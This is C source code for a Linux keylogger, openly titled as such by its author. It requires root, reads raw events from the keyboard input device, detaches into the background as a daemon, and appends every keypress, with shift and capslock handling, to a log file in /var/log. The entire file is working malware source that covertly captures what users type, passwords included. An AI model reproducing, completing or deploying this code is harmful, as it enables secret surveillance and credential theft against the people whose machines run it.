/*

	title		-> keylogger
	description	-> keylogger for linux
	author		-> h4nk_et0

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <time.h>

#define KEY_PRESS	1
#define KEY_RELEASE	0
#define KEY_HOLD	2
#define LOG_FILE	"/var/log/keylog.log"

#include "keys.h"
#include "utils.c"

void main()
{
	char current_time[24];
	unsigned short int shift = 0, capslock = 0;
	int event_fd;
	struct input_event kbd_event;
	FILE *log;
	time_t current_time_raw;

	if(getuid())
	{
		printf("not enough privileges. run it as root ...\n");
		exit(1);
	}

	if((event_fd = open(input_device(),O_RDONLY)) == -1)
	{
		perror("open ");
		exit(1);
	}

	if((log = fopen(LOG_FILE,"a")) == NULL)
	{
		perror("cannot open log file ");
		exit(1);
	}

	if(daemon(1,0) == -1)
	{
		perror("daemonize ");
		exit(1);
	}

	current_time_raw = time(NULL);
	strncpy(current_time,ctime(&current_time_raw),24);
	fprintf(log,"\n\n***********  %s  *************\n\n",current_time);

	while(1)
	{
		if((read(event_fd,&kbd_event,sizeof(struct input_event))) == -1)
		{
			perror("read ");
			continue;
		}

		if(kbd_event.type == EV_KEY)
		{
			if(kbd_event.value == KEY_PRESS || kbd_event.value == KEY_HOLD)
			{
				if(shift_pressed(&kbd_event))
				{
					shift = 1;
					continue;
				}
				if(capslock_pressed(&kbd_event))
				{
					if(capslock)
					{
						capslock = 0;
						continue;
					}
					else if(!capslock)
					{
						capslock = 1;
						continue;
					}
				}

				log_key(shift,capslock,kbd_event.code,log);
			}

			else if(kbd_event.value == KEY_RELEASE)
			{
				if(shift_pressed(&kbd_event))
				{
					shift = 0;
					continue;
				}
			}
		}
	}
}
